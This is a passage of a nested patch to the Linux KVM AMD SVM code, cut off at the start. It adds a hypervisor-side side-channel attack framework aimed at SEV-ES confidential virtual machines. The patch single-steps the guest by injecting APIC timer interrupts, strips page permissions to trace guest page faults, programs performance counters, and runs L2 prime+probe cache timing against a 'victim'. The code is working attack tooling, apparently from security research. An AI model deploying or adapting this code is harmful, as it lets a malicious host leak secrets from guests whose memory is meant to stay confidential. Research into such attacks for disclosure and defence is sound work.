++		* will signal the doorbell if the CPU has already entered the guest.
++		*/
++		smp_mb__after_atomic();
++		svm_complete_interrupt_delivery(apic->vcpu, delivery_mode, trig_mode, vector);
++
++		if (sev_ctx.guest_reschedue_miss > 0) {
++			kvm_lapic_set_irr(0xec, apic);
++			smp_mb__after_atomic();
++			svm_complete_interrupt_delivery(apic->vcpu, sev_ctx.original_apic_delivery_mode, sev_ctx.original_apic_trig_mode, 0xec);
++			sev_ctx.guest_reschedue_miss--;
++			sev_ctx.inject_intr_interception = true;
++		}
++	}
+ }
+ 
+ static void svm_update_cr8_intercept(struct kvm_vcpu *vcpu, int tpr, int irr)
+@@ -4107,9 +4996,9 @@ static void svm_complete_interrupts(struct kvm_vcpu *vcpu)
+ 		if (exitintinfo & SVM_EXITINTINFO_VALID_ERR) {
+ 			u32 err = svm->vmcb->control.exit_int_info_err;
+ 			kvm_requeue_exception_e(vcpu, vector, err);
+-
+-		} else
++		} else {
+ 			kvm_requeue_exception(vcpu, vector);
++		}
+ 		break;
+ 	case SVM_EXITINTINFO_TYPE_INTR:
+ 		kvm_queue_interrupt(vcpu, vector, false);
+@@ -4118,6 +5007,7 @@ static void svm_complete_interrupts(struct kvm_vcpu *vcpu)
+ 		kvm_queue_interrupt(vcpu, vector, true);
+ 		break;
+ 	default:
++		// kvm_clear_interrupt_queue
+ 		break;
+ 	}
+ 
+@@ -4154,21 +5044,334 @@ static fastpath_t svm_exit_handlers_fastpath(struct kvm_vcpu *vcpu)
+ 	return EXIT_FASTPATH_NONE;
+ }
+ 
++/*
++ * Helper to build a PMC control configuration from a value read from memory.
++ * msr_val: The 64-bit value containing the event configuration from the controller.
++ * os_event: If true, this is a guest-OS event (OS=1, User=0); otherwise a user event.
++ *
++ * msr_val fields (from the controller):
++ *   - Bits [0:7]  => umask.
++ *   - Bits [8:15] => event code.
++ *   - Bits [16:19]=> Highest 4 bits of the event.
++ */
++static inline u64 pmc_config_from_val(u64 msr_val, bool os_event)
++{
++    u64 config = 0;
++    config |= (0ULL << 41);        /* HV = 0 */
++    config |= (1ULL << 40);        /* Guest = 1 */
++    config |= (((msr_val >> 16) & 0xF) << 32); /* Additional event bits */
++    config |= (0ULL << 24);        /* CNTMASK = 0 */
++    config |= (0ULL << 23);        /* INV = 0 */
++    config |= (1ULL << 22);        /* EN = 1 */
++    config |= (0ULL << 20);        /* INT = 0 */
++    config |= (0ULL << 18);        /* EDGE = 0 */
++    if (os_event)
++        config |= (1ULL << 17);    /* OS = 1 for OS events */
++    else
++        config |= (1ULL << 16);    /* User = 0 for OS events */
++    config |= ((msr_val & 0xFF) << 8);         /* umask */
++    config |= ((msr_val >> 8) & 0xFF);         /* event */
++    return config;
++}
++
++static void sev_step_initialize_pmcs(void)
++{
++	/* Hardcode the CTL[0]: Retired Instruction */\
++	sev_ctx.msr_ctl[0] = pmc_config_from_val(0xC0FF, false);
++	wrmsrl(MSR_AMDSEV_PERF_CTL, sev_ctx.msr_ctl[0]);
++	wrmsrl(MSR_AMDSEV_PERF_CTR, 0);
++	
++	/* Other user event PMC 1,2,3,4 */
++	for (int i = 1; i < 5; i++) {
++		sev_ctx.msr_ctl[i] = *((volatile u64 *)(sev_ctx.page_va + 1024 + i * 16));
++		if (sev_ctx.msr_ctl[i]) {
++			sev_ctx.msr_ctl[i] = pmc_config_from_val(sev_ctx.msr_ctl[i], false);
++			wrmsrl(MSR_AMDSEV_PERF_CTL + i * 2, sev_ctx.msr_ctl[i]);
++			wrmsrl(MSR_AMDSEV_PERF_CTR + i * 2, 0);
++		}
++	}
++
++	/* The last event for guest OS */
++	sev_ctx.msr_ctl[5] = *((volatile u64 *)(sev_ctx.page_va + 1024 + 5 * 16));
++	if (sev_ctx.msr_ctl[5]) {
++		sev_ctx.msr_ctl[5] = pmc_config_from_val(sev_ctx.msr_ctl[5], true);
++		wrmsrl(MSR_AMDSEV_PERF_CTL + 5 * 2, sev_ctx.msr_ctl[5]);
++		wrmsrl(MSR_AMDSEV_PERF_CTR + 5 * 2, 0);
++	}
++}
++
++static void sev_step_initialize_cache(struct kvm_vcpu *vcpu)
++{
++	struct vcpu_svm *svm = to_svm(vcpu);
++	u64 time_begin, time_delta;
++	u64 no_acc = 0, one_acc = 0, two_acc = 0;
++	u64 pad, hsave;
++
++	/* Map an address with the same cache index as sev_ctx.page_va */
++	void *prime_addr_1 = kmap_local_pfn(0x6B7747);
++
++	/* Disable L1/L2 prefetchers */
++	wrmsrl(0xC0000108, 0x2f);
++
++	/* Block L3 cache for the eviction buffer */
++	wrmsrl(MSR_AMDSEV_RESERVE_RANGE_HIGH, RANGE_HIGH_VALUE | 0x1ULL);
++
++	/* Calculate padding values for hsave and vmsa pages */
++	rdmsrl(MSR_VM_HSAVE_PA, hsave);
++	sev_ctx.hsave_page_pad = l2_index_pad(sev_ctx.evict_buffer_pa, hsave);
++	sev_ctx.vmsa_page_pad = l2_index_pad(sev_ctx.evict_buffer_pa, svm->vmcb->control.vmsa_pa);
++
++	/* Calculate pad for sev_ctx.page_va */
++	pad = l2_index_pad(sev_ctx.evict_buffer_pa, __pa(sev_ctx.page_va));
++	u64 target_l2_original_index = (__pa(sev_ctx.page_va) & 0x1ffff) >> 6;
++	pad ^= target_l2_original_index;
++
++	/* Clean cache and disable interrupts */
++	asm volatile ("wbinvd\nmfence\n");
++	asm volatile("cli\n");
++
++	prime_l2_set(sev_ctx.evict_buffer, 1, 1, 1, 1);
++	prime_l2_set_reverse(sev_ctx.evict_buffer, 1, 1, 1, 1);
++	asm volatile ("mfence\n");
++
++	/* Example timing loops to compute thresholds */
++	for (int i = 0; i < 10000; i++) {
++		REP2(prime_l2_set_reverse(sev_ctx.evict_buffer + (pad << 6), 1, 1, 1, 8);)
++		asm volatile ("mfence\n");
++		*((volatile u64 *)(sev_ctx.page_va + 17 * 64));
++		maccess(sev_ctx.evict_buffer + (9 << 17) + (2 * 64));
++		maccess(sev_ctx.evict_buffer + (9 << 17) + (53 * 64));
++		maccess(sev_ctx.evict_buffer + (9 << 17) + (17 * 64));
++		maccess(sev_ctx.evict_buffer + (9 << 17) + (36 * 64));
++		asm volatile ("mfence\n");
++		
++		time_begin = rdpru_a();
++		REP1(prime_l2_set_reverse(sev_ctx.evict_buffer + (pad << 6), 3, 1, 1, 8);)
++		REP1(prime_l2_set(sev_ctx.evict_buffer + (pad << 6), 1, 1, 1, 8);)
++		asm volatile("mfence\n");
++		time_delta = rdpru_a() - time_begin;
++		no_acc += time_delta;
++	}
++
++	for (int i = 0; i < 10000; i++) {
++		REP2(prime_l2_set_reverse(sev_ctx.evict_buffer + (pad << 6), 1, 1, 1, 8);)
++		asm volatile ("mfence\n");
++		*((volatile u64 *)(sev_ctx.page_va));   // Evict
++		maccess(sev_ctx.evict_buffer + (9 << 17) + (47 * 64)); // Not evict
++		maccess(sev_ctx.evict_buffer + (9 << 17) + (53 * 64)); // Not evict
++		maccess(sev_ctx.evict_buffer + (9 << 17) + (21 * 64)); // Not evict
++		maccess(sev_ctx.evict_buffer + (9 << 17) + (61 * 64)); // Not evict
++		asm volatile ("mfence\n");
++
++		time_begin = rdpru_a();
++		REP1(prime_l2_set_reverse(sev_ctx.evict_buffer + (pad << 6), 3, 1, 1, 8);)
++		REP1(prime_l2_set(sev_ctx.evict_buffer + (pad << 6), 1, 1, 1, 8);)
++		asm volatile("mfence\n");
++		time_delta = (rdpru_a() - time_begin);
++		one_acc += time_delta;
++	}
++
++	for (int i = 0; i < 10000; i++) {
++		REP2(prime_l2_set_reverse(sev_ctx.evict_buffer+(pad<<6), 1, 1, 1, 8);)
++		asm volatile ("mfence\n");
++		*((volatile u64 *)(sev_ctx.page_va)); // Evict
++		maccess(sev_ctx.evict_buffer + (9 << 17) + (47 * 64)); // Not evict
++		*((volatile u64 *)(prime_addr_1));	// Evict
++		maccess(sev_ctx.evict_buffer + (9 << 17) + (21 * 64)); // Not evict
++		maccess(sev_ctx.evict_buffer + (9 << 17) + (61 * 64)); // Not evict
++		asm volatile ("mfence\n");
++
++		time_begin = rdpru_a();
++		REP1(prime_l2_set_reverse(sev_ctx.evict_buffer + (pad << 6), 3, 1, 1, 8);)
++		REP1(prime_l2_set(sev_ctx.evict_buffer + (pad << 6), 1, 1, 1, 8);)
++		asm volatile("mfence\n");
++		time_delta = (rdpru_a() - time_begin);
++		two_acc += time_delta;
++	}
++
++	/* Enable Interrupts */
++	asm volatile("sti\n");
++
++	kunmap_local(prime_addr_1);
++	trace_printk("[DEBUG] no_acc:%lld one_acc:%lld two_acc:%lld\n", no_acc/10000, one_acc/10000, two_acc/10000);
++	
++	sev_ctx.prime_probe_no_acc_threshold = (no_acc * 3 + one_acc * 2) / 5 / 10000;
++	sev_ctx.prime_probe_one_acc_threshold = (one_acc * 2 + two_acc * 3) / 5 / 10000;
++	// sev_ctx.prime_probe_no_acc_threshold	= PRIME_PROBE_NO_ACC_THRESHOLD;
++	// sev_ctx.prime_probe_one_acc_threshold = PRIME_PROBE_ONE_ACC_THRESHOLD;
++}
++
++static void sev_step_initialize(struct kvm_vcpu *vcpu, u8 pmc_clf_sw, u8 cache_sca)
++{
++	struct vcpu_svm *svm = to_svm(vcpu);
++	sev_ctx.state = SEVSCA_STATE_INIT;
++	sev_ctx.mem_mapped_queue_size = *((volatile u8 *)(sev_ctx.page_va + 96));
++	sev_ctx.cf_npf_num = 0;
++
++	if (pmc_clf_sw) {
++		kvm_sca_modify_all(vcpu->kvm, svm->vmcb->control.asid, 1); // NX
++	} else {
++		kvm_sca_modify_all(vcpu->kvm, svm->vmcb->control.asid, 3); // NX+W
++		kvm_unpre_all(vcpu->kvm, svm->vmcb->control.asid, true);
++	}
++	svm_flush_tlb_current(vcpu);
++	sev_step_initialize_pmcs();
++
++	if (cache_sca)
++		sev_step_initialize_cache(vcpu);
++}
++
++static inline void do_cache_probe(u64 probe_page)
++{
++    u64 time_begin;
++    int time_delta;
++    u8 one_hit_num = 0, two_hit_num = 0;
++    u8 cls_hits[64];
++
++    asm volatile("cli\n" ::: "memory");
++    asm volatile("mfence\n" ::: "memory");
++
++    /* Prime TLB/cache */
++    prime_l2_set(sev_ctx.evict_buffer, 1, 1, 1, 1);
++    rdpru_a();
++    maccess(sev_ctx.evict_set_offset);
++	maccess(sev_ctx.evict_buffer);
++    asm volatile("mfence\n" ::: "memory");
++
++    for (int i = 0; i < 64; i++) {
++        time_begin = rdpru_a();
++		REP1(prime_l2_set_reverse(sev_ctx.evict_buffer + (sev_ctx.evict_set_offset[i] << 6), 3, 1, 1, 8);)
++		REP1(prime_l2_set(sev_ctx.evict_buffer + (sev_ctx.evict_set_offset[i] << 6), 1, 1, 1, 8);)
++        asm volatile("mfence\n" ::: "memory");
++        time_delta = rdpru_a() - time_begin;
++
++        if (time_delta < sev_ctx.prime_probe_no_acc_threshold)
++            cls_hits[i] = 0;
++        else if (time_delta < sev_ctx.prime_probe_one_acc_threshold) {
++            cls_hits[i] = 1;
++            one_hit_num++;
++        } else {
++            cls_hits[i] = 2;
++            two_hit_num++;
++        }
++    }
++
++	if (one_hit_num || two_hit_num) {
++		u8 noise = 0;
++		u16 pad = (u16)l2_index_pad(sev_ctx.evict_buffer_pa, probe_page);
++		if (pad == sev_ctx.vmsa_page_pad)
++			noise++;
++		if (pad == sev_ctx.hsave_page_pad)
++			noise++;
++		if (two_hit_num && !noise)
++			noise++;
++		trace_printk("CL %06llx", probe_page);
++		for (int i = 0; i < 64; i++) {
++			if (cls_hits[i] > noise)
++				trace_printk(" %d", i);
++		}
++		trace_printk("\n");
++	}
++    asm volatile("sti\n" ::: "memory");
++}
++
++static noinstr void svm_prime_cache(u8 clean_cache)
++{
++    /* If requested, flush the cache to get a clean state. */
++    if (clean_cache) {
++        asm volatile("wbinvd\n mfence\n" ::: "memory");
++    }
++
++    /* Prime the latest mapped memory page if it exists. */
++	if (sev_ctx.mem_mapped_gfn[sev_ctx.mem_mapped_queue_size - 1]) {
++		for (int i = 0; i < 64; i++) {
++			REP2(prime_l2_set_reverse((sev_ctx.evict_buffer + (sev_ctx.evict_set_offset[i] << 6)), 1, 1, 1, 8);)
++		}
++	}
++	asm volatile("mfence\n" ::: "memory");
++}
++
+ static noinstr void svm_vcpu_enter_exit(struct kvm_vcpu *vcpu, bool spec_ctrl_intercepted)
+ {
+ 	struct svm_cpu_data *sd = per_cpu_ptr(&svm_data, vcpu->cpu);
+ 	struct vcpu_svm *svm = to_svm(vcpu);
++	
++	u32 flag = *((volatile u32 *)(sev_ctx.page_va));
++	u8 sw = flag & 0xff;
++	u8 clean_cache = (flag >> 9) & 0x1;
++	u8 cache_sca = (flag >> 10) & 0x1;
++	u8 pmc_clf_sw = (flag >> 15) & 0x1;
++
++	if (sev_ctx.state == SEVSCA_STATE_UNINITIALIZED)
++		sev_ctx.apic_interval = 0;
+ 
+ 	guest_state_enter_irqoff();
+ 
+ 	amd_clear_divider();
+ 
+-	if (sev_es_guest(vcpu->kvm))
++	/* If started injecting APIC-timer int for rescheduling tasks */
++	/* If inject_intr_interception sets, injecting interrupts is allowed */
++	if (sev_ctx.start_injecting_apic && (sev_ctx.guest_reschedue_miss > 0)) {
++		kvm_lapic_set_irr(0xec, vcpu->arch.apic);
++		smp_mb__after_atomic();
++		svm_complete_interrupt_delivery(vcpu,
++			sev_ctx.original_apic_delivery_mode,
++			sev_ctx.original_apic_trig_mode, 0xec);
++		sev_ctx.inject_intr_interception = true;
++		trace_printk("[DEBUG] INJECTING APIC TIMER INTERRUPTS! REMAINING:%d\n", sev_ctx.guest_reschedue_miss);
++		sev_ctx.guest_reschedue_miss--;
++		if (sev_ctx.guest_reschedue_miss <= 0)
++			sev_ctx.start_injecting_apic = false;
++	}
++	
++	/* Prime */
++	if (cache_sca) {
++		svm_prime_cache(clean_cache);
++	}
++
++	if (sev_es_guest(vcpu->kvm)) {
+ 		__svm_sev_es_vcpu_run(svm, spec_ctrl_intercepted,
+-				      sev_es_host_save_area(sd));
++		                      sev_es_host_save_area(sd), (u32*)(APIC_BASE + APIC_TMICT),
++		                      sev_ctx.apic_interval);
++	}
+ 	else
+ 		__svm_vcpu_run(svm, spec_ctrl_intercepted);
+ 
++	if (sw == 0x77) {
++		u32 exit_code = svm->vmcb->control.exit_code;
++		u64 error_code = svm->vmcb->control.exit_info_1;
++
++		/* For CacheAttack we want to do it as early as possible */
++		/* To avoid cache pollution from the attacker's code itself */
++		if (sev_ctx.state) {
++			bool probe_cache = sev_ctx.is_interesting_ma_page &&
++			                   (exit_code == SVM_EXIT_NPF) &&
++			                   (cache_sca != 0) &&
++			                   (sev_ctx.last_cf_npf_gfn != 0);
++
++			if (probe_cache) {
++				bool do_cache_trace = is_user_code_page(error_code) ||
++				                      is_data_page_fault(error_code);
++				/* The last memory access page has been primed */
++				u64 last_mapped = sev_ctx.mem_mapped_gfn[sev_ctx.mem_mapped_queue_size - 1];
++				if (do_cache_trace && (last_mapped > 0))
++					do_cache_probe(last_mapped);
++			}
++
++			/* If the victim uses single thread, the hv does not need to inject APIC interrupts */
++			if (!sev_ctx.inject_intr_interception && sev_ctx.state) {
++				if (((svm->vmcb->control.event_inj & 0xff) == 0xec) &&
++				    (svm->vcpu.arch.interrupt.injected)) {
++					svm->vcpu.arch.interrupt.injected = false;
++				}
++			}
++		}
++		/* Configure performance counters and unmap guest pages. */
++		else {
++			sev_step_initialize(vcpu, pmc_clf_sw, cache_sca);
++		}
++	}
++
+ 	guest_state_exit_irqoff();
+ }
+ 
+@@ -4177,7 +5380,7 @@ static __no_kcsan fastpath_t svm_vcpu_run(struct kvm_vcpu *vcpu,
+ {
+ 	struct vcpu_svm *svm = to_svm(vcpu);
+ 	bool spec_ctrl_intercepted = msr_write_intercepted(vcpu, MSR_IA32_SPEC_CTRL);
+-
++	
+ 	trace_kvm_entry(vcpu, force_immediate_exit);
+ 
+ 	svm->vmcb->save.rax = vcpu->arch.regs[VCPU_REGS_RAX];
+@@ -4900,6 +6103,7 @@ static int svm_check_emulate_instruction(struct kvm_vcpu *vcpu, int emul_type,
+ 	}
+ 
+ resume_guest:
++	trace_printk("stuck here (resume_guest)\n");
+ 	/*
+ 	 * If the erratum was not hit, simply resume the guest and let it fault
+ 	 * again.  While awful, e.g. the vCPU may get stuck in an infinite loop
+diff --git a/arch/x86/kvm/svm/svm.h b/arch/x86/kvm/svm/svm.h
+index 76107c7d0595..0911f6dce2a5 100644
+--- a/arch/x86/kvm/svm/svm.h
++++ b/arch/x86/kvm/svm/svm.h
+@@ -581,6 +581,14 @@ static inline bool is_vnmi_enabled(struct vcpu_svm *svm)
+ 
+ extern bool dump_invalid_vmcb;
+ 
++/* =================STEP================== */
++// void maccess(void *p);
++// u64 rdpru_a(void);
++// void prime_l2_set(void* addr, int C, int D, int L, int S);
++// void prime_l2_set_reverse(void* addr, int C, int D, int L, int S);
++// u64 l2_index_pad(uint64_t evc_mem, uint64_t tar_mem);
++/* =================================== */
++
+ u32 svm_msrpm_offset(u32 msr);
+ u32 *svm_vcpu_alloc_msrpm(void);
+ void svm_vcpu_init_msrpm(struct kvm_vcpu *vcpu, u32 *msrpm);
+@@ -784,8 +792,10 @@ static inline int sev_private_max_mapping_level(struct kvm *kvm, kvm_pfn_t pfn)
+ 
+ /* vmenter.S */
+ 
++// void __svm_sev_es_vcpu_run(struct vcpu_svm *svm, bool spec_ctrl_intercepted,
++// 			   struct sev_es_save_area *hostsa);
+ void __svm_sev_es_vcpu_run(struct vcpu_svm *svm, bool spec_ctrl_intercepted,
+-			   struct sev_es_save_area *hostsa);
++			   struct sev_es_save_area *hostsa, u32* apic_reg_addr, u32 apic_interval);
+ void __svm_vcpu_run(struct vcpu_svm *svm, bool spec_ctrl_intercepted);
+ 
+ #define DEFINE_KVM_GHCB_ACCESSORS(field)						\
+diff --git a/arch/x86/kvm/svm/vmenter.S b/arch/x86/kvm/svm/vmenter.S
+index a0c8eb37d3e1..1039891545d6 100644
+--- a/arch/x86/kvm/svm/vmenter.S
++++ b/arch/x86/kvm/svm/vmenter.S
+@@ -344,6 +344,16 @@ SYM_FUNC_START(__svm_sev_es_vcpu_run)
+ 	/* Enter guest mode */
+ 	sti
+ 
++	/* Do not use APIC */
++	cmp $0, %_ASM_ARG5L
++	je 1f
++
++	/* wbinvd */
++
++	/* APIC Interval */
++	movl %_ASM_ARG5L, (%_ASM_ARG4)
++
++
+ 1:	vmrun %rax
+ 
+ 2:	cli
+diff --git a/arch/x86/kvm/x86.c b/arch/x86/kvm/x86.c
+index 70219e406987..a1642653caab 100644
+--- a/arch/x86/kvm/x86.c
++++ b/arch/x86/kvm/x86.c
+@@ -10735,7 +10735,7 @@ void __kvm_set_or_clear_apicv_inhibit(struct kvm *kvm,
+ 			unsigned long gfn = gpa_to_gfn(APIC_DEFAULT_PHYS_BASE);
+ 			int idx = srcu_read_lock(&kvm->srcu);
+ 
+-			kvm_zap_gfn_range(kvm, gfn, gfn+1);
++			kvm_zap_gfn_range(kvm, gfn, gfn+1, false);
+ 			srcu_read_unlock(&kvm->srcu, idx);
+ 		}
+ 	} else {
+@@ -13546,7 +13546,7 @@ static void kvm_noncoherent_dma_assignment_start_or_stop(struct kvm *kvm)
+ 	 * with the correct "ignore guest PAT" setting are created.
+ 	 */
+ 	if (kvm_mmu_may_ignore_guest_pat())
+-		kvm_zap_gfn_range(kvm, gpa_to_gfn(0), gpa_to_gfn(~0ULL));
++		kvm_zap_gfn_range(kvm, gpa_to_gfn(0), gpa_to_gfn(~0ULL), false);
+ }
+ 
+ void kvm_arch_register_noncoherent_dma(struct kvm *kvm)
+diff --git a/mm/page_isolation.c b/mm/page_isolation.c
+index 042937d5abe4..5b06ccd814f2 100644
+--- a/mm/page_isolation.c
++++ b/mm/page_isolation.c
+@@ -536,6 +536,8 @@ int start_isolate_page_range(unsigned long start_pfn, unsigned long end_pfn,
+ 	return 0;
+ }
+ 
++EXPORT_SYMBOL_GPL(start_isolate_page_range);
++
+ /**
+  * undo_isolate_page_range - undo effects of start_isolate_page_range()
+  * @start_pfn:		The first PFN of the isolated range
+@@ -562,6 +564,9 @@ void undo_isolate_page_range(unsigned long start_pfn, unsigned long end_pfn,
+ 		unset_migratetype_isolate(page, migratetype);
+ 	}
+ }
++
++EXPORT_SYMBOL_GPL(undo_isolate_page_range);
++
+ /*
+  * Test all pages in the range is free(means isolated) or not.
+  * all pages in [start_pfn...end_pfn) must be in the same zone.
+-- 
+2.43.0
+
